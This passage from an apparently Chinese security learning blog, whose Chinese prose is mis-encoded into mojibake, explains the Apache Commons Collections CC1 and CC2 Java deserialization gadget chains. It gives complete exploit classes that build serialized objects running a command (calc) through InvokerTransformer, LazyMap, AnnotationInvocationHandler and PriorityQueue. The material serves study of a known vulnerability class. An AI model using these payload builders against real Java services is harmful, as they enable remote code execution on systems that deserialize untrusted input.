 String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">            <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">            new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥åå°„ä½¿ç”¨getMethodè·å–getRuntimeè¿™ä¸ªæ–¹æ³•å¯¹è±¡ã€‚å†invokeè·å–getRuntimeçš„æ‰§è¡Œç»“æœã€‚æœ€åç›´æ¥åå°„æ‰§è¡Œexec calc.æˆ–è€…ä¼ å­—ç¬¦ä¸²æ•°ç»„æ‰§è¡Œç‰¹æ®Šå‘½ä»¤å¼¹shell.</p><p>åˆ°è¿™ä¸€æ­¥ä¸ºæ­¢è¾¾æˆäº†ï¼š <strong>ååºåˆ—åŒ–æ—¶æ‰§è¡Œtransformæ–¹æ³•å³å¯rce</strong>.ä¸‹é¢å°±æ˜¯æ‰¾å¯ç”¨ç±»é“¾å­äº†ã€‚å› ä¸ºä¸å¯èƒ½ç›´æ¥å°±åœ¨readObjecté‡Œè°ƒç”¨transformå§ã€‚</p><p>ä¸‹é¢æ˜¯cc1ä¸­é“¾å­çš„å¼€å§‹ã€‚<br>org.apache.commons.collections.map.LazyMap å®ƒå®ç°äº†Serializableæ¥å£å¹¶å­˜åœ¨readObjectæ–¹æ³•ã€‚</p><p>LazyMapçš„getæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>this.factory.transform(key)</code>å°±æ˜¯ä¸€ä¸ªè°ƒç”¨äº†transformçš„ä¾‹å­ã€‚é‚£ä¹ˆåªè¦factoryå¯æ§å°±èƒ½è°ƒç”¨ä¸Šé¢çš„åå°„rceäº†ã€‚</p><p>çœ‹ä¸‹æ„é€ æ–¹æ³•ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/36.PNG" class="lazyload" data-srcset="36.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è™½ç„¶åªè¦å®ä¾‹åŒ–çš„è¯å°±èƒ½æ§åˆ¶factoryäº†ã€‚ä½†æ˜¯è¿™ä¸æ˜¯ä¸€ä¸ªpublicçš„æ„é€ æ–¹æ³•ï¼Œåœ¨javaä¸­æƒ³è¦è·å–åˆ°è¿™ä¸ªæ„é€ æ–¹æ³•è¿˜æ˜¯å¾—ç”¨åå°„ã€‚<br>æ­¤æ—¶çš„expå·²ç»å¯ä»¥å†™æˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                    <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                    new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">    HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map<span class="class">.<span class="keyword">class</span>, <span class="title">Transformer</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);</span><br><span class="line">    map.get(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæœ€åä¹Ÿæ˜¯æœ€éš¾çš„ä¸€ç‚¹å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨getå¹¶ä¼ é€’ä»»æ„å€¼çš„åœ°æ–¹ï¼Œæ¥è°ƒç”¨æˆ‘ä»¬lazymapçš„getæ–¹æ³•ã€‚è¿™ä¹Ÿå°±æ˜¯ä½œè€…çš„å¼ºå¤§ä¹‹å¤„ã€‚</p><p>jdk1.7ç‰ˆæœ¬ä¸‹æ‰¾åˆ°çš„æ˜¯sun.reflect.annotation.AnnotationInvocationHandler<br>æ³¨æ„ä½ ç›´æ¥å¯¼å…¥æ˜¯å¯¼ä¸äº†è¿™ä¸ªç±»çš„ã€‚å¯ä»¥åœ¨jreçš„rt.jar ä¸­æ‰¾åˆ°è¿™ä¸ª\sun\reflect\annotation\AnnotationInvocationHandler.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡ŒreadObjectåˆè°ƒç”¨äº†<code>this.memberValuesçš„entrySet</code>æ–¹æ³•ã€‚å¦‚æœè¿™é‡Œçš„memberValuesæ˜¯ä¸ªä»£ç†ç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨memberValueså¯¹åº”handlerçš„invokeæ–¹æ³•ï¼Œcc1ä¸­å°†handlerè®¾ç½®ä¸ºAnnotationInvocationHandlerï¼ˆå…¶å®ç°äº†InvocationHandlerï¼Œæ‰€ä»¥å¯ä»¥è¢«è®¾ç½®ä¸ºä»£ç†ç±»çš„handlerï¼‰</p><p>è¿™ä¹Ÿå°±æ˜¯java çš„åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚è°ƒç”¨entrysetè¿™ä¸ªæ–¹æ³•å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ä»£ç†çš„<code>invoke</code>.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/37.PNG" class="lazyload" data-srcset="37.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>invokeé‡Œåˆè°ƒç”¨äº†memberValuesçš„get.é‚£ä¹ˆåªè¦ä»¤memberValuesä¸ºæˆ‘ä»¬æ„é€ å¥½çš„Lazymapå¯¹è±¡å³å¯</p><p>final exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.HashBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.annotation.AnnotationParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.IdentityHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map<span class="class">.<span class="keyword">class</span>, <span class="title">Transformer</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">invo</span>)</span>;</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>, <span class="title">proxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonCollections2</li></ul><p>é¦–å…ˆæ³¨æ„æ˜¯CommonsCollections4çš„ä¾èµ–</p><p>èµ·ç‚¹æ˜¯<br>java.util.PriorityQueue#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in "proper order", but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œqueueå¯æ§ã€‚ç„¶åä¸€æ¡é“¾èµ°å‘heapify =&gt; siftDown =&gt; siftDownUsingComparator =&gt; comparator.compare</p><p>è¿™é‡Œå°±å¯ä»¥å¼€å¯æ–°çš„gadgetäº†ã€‚æ¯”å¦‚cc2é“¾å­ä¸­ä½¿ç”¨çš„æ˜¯<br>org.apache.commons.collections4.comparators.TransformingComparator çš„åŒåcompareæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transformæ–¹æ³•çš„ä½œç”¨è‡ªç„¶æ˜¯ä¹‹å‰çš„ä¸€å¥—åå°„ç»„åˆæ‹³è¿›è¡Œrceäº†ã€‚æ‰€ä»¥éœ€è¦<code>transformer</code>å¯æ§ã€‚è€Œä»æ„é€ æ–¹æ³•å»çœ‹çš„è¯ä¼šå‘ç°ä¹Ÿæ˜¯å¯æ§çš„ã€‚</p><p>è¿™é‡Œå°±å¯ä»¥å†™ä¸€ä¸ªexp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆæ³¨æ„queueåŠ äº†ä¸¤ä¸ªå…ƒç´ ï¼Œè¿™æ˜¯å› ä¸ºsizeä¸å¤§äº1çš„è¯æ— æ³•è¿›å…¥siftDownæ–¹æ³•ã€‚ç„¶åqueue.addè¿™æ®µä»£ç ä¸èƒ½æ”¾åˆ°åå°„å®ä¾‹åŒ–comparatorçš„åé¢ã€‚å› ä¸ºä»£ç æ®µä¸­å¦‚æœcomparatorä¸ä¸ºnullä¼šæ”¾ä¸è¿›å»å…ƒç´ ã€‚</p><p>ç„¶åå…¶å®ä¸Šé¢è¿™ä¸ªexpå¹¶ä¸æ˜¯ysoserial CC2çš„expé“¾å­ã€‚å®ƒä½¿ç”¨çš„æ˜¯javassist + TemplatesImplã€‚é¦–å…ˆç®€å•è¯´æ˜ä¸‹javassist,å®ƒæä¾›äº†ä¿®æ”¹å­—èŠ‚ç çš„åŠŸèƒ½ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬æ‰‹åŠ¨ç”Ÿæˆä¸€ä¸ªbyc404.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"System.out.println(\"evil code\");"</span>;</span><br><span class="line">        <span 